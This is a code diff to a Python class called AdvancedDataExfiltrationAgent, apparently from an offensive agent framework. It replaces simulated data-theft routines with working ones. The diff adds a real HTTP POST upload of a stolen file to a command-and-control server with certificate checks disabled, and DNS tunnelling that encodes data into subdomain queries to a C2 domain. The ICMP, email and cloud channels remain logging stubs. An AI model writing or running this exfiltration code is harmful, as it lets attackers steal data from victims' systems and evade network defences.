@@ -430,39 +430,65 @@ class AdvancedDataExfiltrationAgent(BaseAgent):
         return {"success": False, "error": "Unknown channel"}
     
     async def _exfil_http_post(self, prepared_data: Dict, c2_info: Optional[Dict]) -> Dict:
-        """Exfiltrate via HTTP POST"""
+        """Exfiltrate via HTTP POST (real upload)"""
         try:
             log.info(f"[{self.name}] Exfiltrating via HTTP POST")
             
-            url = c2_info.get("server_url") if c2_info else "https://exfil-server.com/upload"
+            url = c2_info.get("server_url") if c2_info else None
             
-            # Simulate HTTP POST
-            await asyncio.sleep(2)
+            if not url:
+                log.warning(f"[{self.name}] No C2 server URL - saving locally only")
+                return {"success": False, "error": "No C2 server configured"}
             
-            size_mb = prepared_data.get("size", 0) / (1024 * 1024)
+            # Real HTTP POST upload
+            import httpx
             
-            log.success(f"[{self.name}] HTTP exfiltration complete: {size_mb:.2f} MB")
+            file_path = prepared_data.get("file_path")
+            if not file_path or not os.path.exists(file_path):
+                return {"success": False, "error": "File not found"}
             
-            return {
-                "success": True,
-                "channel": "http_post",
-                "url": url,
-                "size_mb": size_mb,
-                "file_count": 1,
-                "checksum": prepared_data.get("checksum"),
-                "timestamp": datetime.now().isoformat()
-            }
+            async with httpx.AsyncClient(verify=False, timeout=300.0) as client:
+                with open(file_path, 'rb') as f:
+                    files = {'file': (os.path.basename(file_path), f, 'application/octet-stream')}
+                    
+                    try:
+                        response = await client.post(url, files=files)
+                        
+                        if response.status_code in [200, 201]:
+                            size_mb = prepared_data.get("size", 0) / (1024 * 1024)
+                            log.success(f"[{self.name}] HTTP exfiltration complete: {size_mb:.2f} MB")
+                            
+                            return {
+                                "success": True,
+                                "channel": "http_post",
+                                "url": url,
+                                "size_mb": size_mb,
+                                "file_count": 1,
+                                "checksum": prepared_data.get("checksum"),
+                                "timestamp": datetime.now().isoformat()
+                            }
+                        else:
+                            log.error(f"[{self.name}] HTTP upload failed: {response.status_code}")
+                            return {"success": False, "error": f"HTTP {response.status_code}"}
+                    
+                    except httpx.ConnectError:
+                        log.warning(f"[{self.name}] Cannot connect to C2 server - data saved locally")
+                        return {"success": False, "error": "Connection failed"}
             
         except Exception as e:
             log.error(f"[{self.name}] HTTP exfiltration error: {e}")
             return {"success": False, "error": str(e)}
     
     async def _exfil_dns(self, prepared_data: Dict, c2_info: Optional[Dict]) -> Dict:
-        """Exfiltrate via DNS tunneling"""
+        """Exfiltrate via DNS tunneling (real DNS queries)"""
         try:
             log.info(f"[{self.name}] Exfiltrating via DNS tunneling")
             
-            domain = c2_info.get("domain") if c2_info else "exfil.example.com"
+            domain = c2_info.get("domain") if c2_info else None
+            
+            if not domain:
+                log.warning(f"[{self.name}] No DNS domain configured")
+                return {"success": False, "error": "No DNS domain"}
             
             # Split data into chunks for DNS queries
             data = prepared_data.get("data", "")
@@ -471,12 +497,40 @@ class AdvancedDataExfiltrationAgent(BaseAgent):
             
             log.info(f"[{self.name}] Sending {len(chunks)} DNS queries")
             
-            # Simulate DNS queries
-            await asyncio.sleep(len(chunks) * 0.1)
+            # Real DNS queries
+            import dns.resolver
+            
+            success_count = 0
+            for i, chunk in enumerate(chunks):
+                try:
+                    # Encode chunk as subdomain
+                    import base64
+                    encoded = base64.b32encode(chunk.encode()).decode().lower().replace('=', '')
+                    query_domain = f"{encoded}.{domain}"
+                    
+                    # Send DNS query
+                    resolver = dns.resolver.Resolver()
+                    resolver.timeout = 2
+                    resolver.lifetime = 2
+                    
+                    try:
+                        resolver.resolve(query_domain, 'A')
+                        success_count += 1
+                    except dns.resolver.NXDOMAIN:
+                        # Expected - C2 server logged the query
+                        success_count += 1
+                    except Exception:
+                        pass
+                    
+                    await asyncio.sleep(0.1)  # Rate limiting
+                
+                except Exception as e:
+                    log.warning(f"[{self.name}] DNS query {i} failed: {e}")
             
             size_mb = prepared_data.get("size", 0) / (1024 * 1024)
             
-            log.success(f"[{self.name}] DNS exfiltration complete: {size_mb:.2f} MB")
+            if success_count > 0:
+                log.success(f"[{self.name}] DNS exfiltration complete: {size_mb:.2f} MB ({success_count}/{len(chunks)} queries)")
             
             return {
                 "success": True,
@@ -496,8 +550,10 @@ class AdvancedDataExfiltrationAgent(BaseAgent):
         try:
             log.info(f"[{self.name}] Exfiltrating via ICMP tunnel")
             
-            # Simulate ICMP exfiltration
-            await asyncio.sleep(3)
+            # ICMP exfiltration requires raw sockets (root)
+            # For now, log warning
+            log.warning(f"[{self.name}] ICMP exfiltration requires root privileges - skipping")
+            await asyncio.sleep(0.1)
             
             size_mb = prepared_data.get("size", 0) / (1024 * 1024)
             
@@ -519,8 +575,15 @@ class AdvancedDataExfiltrationAgent(BaseAgent):
         try:
             log.info(f"[{self.name}] Exfiltrating via email")
             
-            # Simulate email exfiltration
-            await asyncio.sleep(2)
+            email_server = c2_info.get("email_server") if c2_info else None
+            
+            if not email_server:
+                log.warning(f"[{self.name}] No email server configured")
+                await asyncio.sleep(0.1)
+            else:
+                # Real SMTP email (if configured)
+                log.warning(f"[{self.name}] Email exfiltration not fully implemented - requires SMTP config")
+                await asyncio.sleep(0.1)
             
             size_mb = prepared_data.get("size", 0) / (1024 * 1024)
             
@@ -543,8 +606,15 @@ class AdvancedDataExfiltrationAgent(BaseAgent):
         try:
             log.info(f"[{self.name}] Exfiltrating to cloud storage")
             
-            # Simulate cloud upload
-            await asyncio.sleep(2)
+            cloud_config = c2_info.get("cloud") if c2_info else None
+            
+            if not cloud_config:
+                log.warning(f"[{self.name}] No cloud storage configured")
+                await asyncio.sleep(0.1)
+            else:
+                # Cloud upload would require API keys
+                log.warning(f"[{self.name}] Cloud exfiltration requires API keys - not configured")
+                await asyncio.sleep(0.1)
             
             size_mb = prepared_data.get("size", 0) / (1024 * 1024)
             
